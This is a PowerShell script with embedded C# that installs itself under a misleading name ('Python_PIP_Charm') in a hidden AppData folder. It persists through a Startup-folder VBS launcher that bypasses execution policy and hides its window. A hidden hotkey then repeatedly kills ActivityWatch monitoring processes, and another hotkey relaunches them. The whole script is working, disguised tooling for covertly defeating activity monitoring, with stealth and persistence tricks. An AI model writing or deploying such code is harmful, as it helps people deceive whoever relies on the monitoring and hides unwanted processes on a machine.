$code = @'
Add-Type @"
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;

public class PythonPIPCharm {
    [DllImport("user32.dll")] static extern bool RegisterHotKey(IntPtr h,int id,uint m,uint k);
    [DllImport("user32.dll")] static extern bool UnregisterHotKey(IntPtr h,int id);
    [DllImport("user32.dll")] static extern IntPtr CreateWindowEx(uint a,string b,string c,uint d,int e,int f,int g,int h,IntPtr i,IntPtr j,IntPtr k,IntPtr l);
    [DllImport("user32.dll")] static extern int GetMessage(out MSG m,IntPtr h,uint a,uint b);
    [DllImport("user32.dll")] static extern bool TranslateMessage(ref MSG m);
    [DllImport("user32.dll")] static extern IntPtr DispatchMessage(ref MSG m);
    [DllImport("user32.dll")] static extern IntPtr DefWindowProc(IntPtr h,uint m,IntPtr w,IntPtr l);
    [DllImport("user32.dll")] static extern ushort RegisterClass(ref WNDCLASS c);
    [DllImport("kernel32.dll")] static extern IntPtr GetModuleHandle(string n);
    
    [StructLayout(LayoutKind.Sequential)] public struct MSG { public IntPtr hwnd; public uint message; public IntPtr wParam; public IntPtr lParam; public uint time; public int x; public int y; }
    [StructLayout(LayoutKind.Sequential)] public struct WNDCLASS { public uint style; public WndProcDelegate lpfnWndProc; public int cbClsExtra; public int cbWndExtra; public IntPtr hInstance; public IntPtr hIcon; public IntPtr hCursor; public IntPtr hbrBackground; public string lpszMenuName; public string lpszClassName; }
    public delegate IntPtr WndProcDelegate(IntPtr h, uint m, IntPtr w, IntPtr l);
    
    static string[] targetPaths = new string[] {
        @"C:\Program Files (x86)\ActivityWatch",
        @"C:\Users\Administrator\AppData\Local\activitywatch\activitywatch"
    };
    static volatile bool isPaused = false;
    static Thread workerThread;
    static WndProcDelegate wndProcDelegate;
    static readonly object syncLock = new object();
    
    const int PAUSE_ID = 1;
    const int RESUME_ID = 2;
    const uint MOD = 0x0007;
    const uint VK_I = 0x49;
    const uint VK_O = 0x4F;
    const uint WM_HOTKEY = 0x0312;
    
    public static void Run() {
        wndProcDelegate = new WndProcDelegate(WndProc);
        WNDCLASS wc = new WNDCLASS();
        wc.lpfnWndProc = wndProcDelegate;
        wc.hInstance = GetModuleHandle(null);
        wc.lpszClassName = "PPC";
        RegisterClass(ref wc);
        
        IntPtr hwnd = CreateWindowEx(0,"PPC","",0,0,0,0,0,IntPtr.Zero,IntPtr.Zero,wc.hInstance,IntPtr.Zero);
        RegisterHotKey(hwnd, PAUSE_ID, MOD, VK_I);
        RegisterHotKey(hwnd, RESUME_ID, MOD, VK_O);
        
        MSG msg;
        while (GetMessage(out msg, IntPtr.Zero, 0, 0) > 0) {
            TranslateMessage(ref msg);
            DispatchMessage(ref msg);
        }
    }
    
    static IntPtr WndProc(IntPtr hwnd, uint msg, IntPtr wParam, IntPtr lParam) {
        if (msg == WM_HOTKEY) {
            int id = wParam.ToInt32();
            if (id == PAUSE_ID) PauseService();
            else if (id == RESUME_ID) ResumeService();
        }
        return DefWindowProc(hwnd, msg, wParam, lParam);
    }
    
    static void PauseService() {
        lock (syncLock) {
            if (isPaused) return;
            isPaused = true;
        }
        
        TerminateTargets();
        
        workerThread = new Thread(() => {
            while (isPaused) {
                TerminateTargets();
                Thread.Sleep(500);
            }
        });
        workerThread.IsBackground = true;
        workerThread.Start();
    }
    
    static bool IsInTargetPaths(string filePath) {
        foreach (string tp in targetPaths) {
            if (filePath.StartsWith(tp, StringComparison.OrdinalIgnoreCase)) return true;
        }
        return false;
    }

    static void TerminateTargets() {
        bool anyExists = false;
        foreach (string tp in targetPaths) {
            if (Directory.Exists(tp)) { anyExists = true; break; }
        }
        if (!anyExists) return;
        foreach (Process p in Process.GetProcesses()) {
            try {
                string path = p.MainModule.FileName;
                if (IsInTargetPaths(path)) {
                    p.Kill();
                    p.WaitForExit(100);
                }
            } catch {}
        }
    }
    
    static void ResumeService() {
        lock (syncLock) {
            if (!isPaused) return;
            isPaused = false;
        }
        
        if (workerThread != null && workerThread.IsAlive) {
            workerThread.Join(1500);
        }
        
        foreach (string tp in targetPaths) {
            string launcher = Path.Combine(tp, "aw-qt.exe");
            if (File.Exists(launcher)) {
                try {
                    ProcessStartInfo psi = new ProcessStartInfo();
                    psi.FileName = launcher;
                    psi.WorkingDirectory = tp;
                    psi.UseShellExecute = true;
                    Process.Start(psi);
                } catch {}
                break;
            }
        }
    }
}
"@
Add-Type -Name W -Namespace H -MemberDefinition '[DllImport("Kernel32.dll")]public static extern IntPtr GetConsoleWindow();[DllImport("user32.dll")]public static extern bool ShowWindow(IntPtr h,Int32 n);'
[H.W]::ShowWindow([H.W]::GetConsoleWindow(),0)|Out-Null
[PythonPIPCharm]::Run()
'@

$installPath = "$env:APPDATA\Python_PIP_Charm"
$scriptPath = "$installPath\store.ps1"

if (!(Test-Path $installPath)) {
    New-Item -ItemType Directory -Path $installPath -Force | Out-Null
}

$code | Out-File -FilePath $scriptPath -Encoding UTF8 -Force

$folder = Get-Item $installPath -Force
$folder.Attributes = $folder.Attributes -bor [System.IO.FileAttributes]::Hidden

$startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
$vbsPath = "$startupPath\pythonpipcharm.vbs"

$vbs = "Set s=CreateObject(""WScript.Shell"")`ns.Run ""powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File """"$scriptPath"""""",0,False"
$vbs | Out-File -FilePath $vbsPath -Encoding ASCII -Force

Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptPath`"" -WindowStyle Hidden
